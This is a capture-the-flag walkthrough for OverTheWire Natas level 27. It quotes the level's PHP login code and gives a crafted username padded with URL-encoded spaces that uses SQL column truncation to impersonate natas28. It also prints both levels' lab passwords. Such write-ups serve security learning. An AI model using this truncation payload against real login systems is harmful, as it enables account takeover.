# Natas27 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas27
Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
URL:      http://natas27.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- This is another SQLI challenge based on truncatation.

  ```
  <body>
  <h1>natas27</h1>
  <div id="content">
  <?php
  
  // morla / 10111
  // database gets cleared every 5 min
  
  
  /*
  CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
  );
  */
  
  
  function checkCredentials($link,$usr,$pass){
  
      $user=mysqli_real_escape_string($link, $usr);
      $password=mysqli_real_escape_string($link, $pass);
  
      $query = "SELECT username from users where username='$user' and password='$password' ";
      $res = mysqli_query($link, $query);
      if(mysqli_num_rows($res) > 0){
          return True;
      }
      return False;
  }
  
  
  function validUser($link,$usr){
  
      $user=mysqli_real_escape_string($link, $usr);
  
      $query = "SELECT * from users where username='$user'";
      $res = mysqli_query($link, $query);
      if($res) {
          if(mysqli_num_rows($res) > 0) {
              return True;
          }
      }
      return False;
  }
  
  
  function dumpData($link,$usr){
  
      $user=mysqli_real_escape_string($link, trim($usr));
  
      $query = "SELECT * from users where username='$user'";
      $res = mysqli_query($link, $query);
      if($res) {
          if(mysqli_num_rows($res) > 0) {
              while ($row = mysqli_fetch_assoc($res)) {
                  // thanks to Gobo for reporting this bug!
                  //return print_r($row);
                  return print_r($row,true);
              }
          }
      }
      return False;
  }
  
  
  function createUser($link, $usr, $pass){
  
      if($usr != trim($usr)) {
          echo "Go away hacker";
          return False;
      }
      $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
      $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
  
      $query = "INSERT INTO users (username,password) values ('$user','$password')";
      $res = mysqli_query($link, $query);
      if(mysqli_affected_rows($link) > 0){
          return True;
      }
      return False;
  }
  
  
  if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
      $link = mysqli_connect('localhost', 'natas27', '<censored>');
      mysqli_select_db($link, 'natas27');
  
  
      if(validUser($link,$_REQUEST["username"])) {
          //user exists, check creds
          if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
              echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
              echo "Here is your data:<br>";
              $data=dumpData($link,$_REQUEST["username"]);
              print htmlentities($data);
          }
          else{
              echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
          }
      }
      else {
          //user doesn't exist
          if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
              echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
          }
      }
  
      mysqli_close($link);
  } else {
  ?>
  
  <form action="index.php" method="POST">
  Username: <input name="username"><br>
  Password: <input name="password" type="password"><br>
  <input type="submit" value="login" />
  </form>
  <?php } ?>
  ```

- Intercept the login request and change parameters to this:

  ```
  username=natas28+++++++++++++++++++++++++++++++++++++++++++++++X&password=test
  ```

- `+` signs are URL encoded Spaces. Now, login as `natas28:test` and read the password.

---

## 🏁 Password for the next level

`Password for natas28 is: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
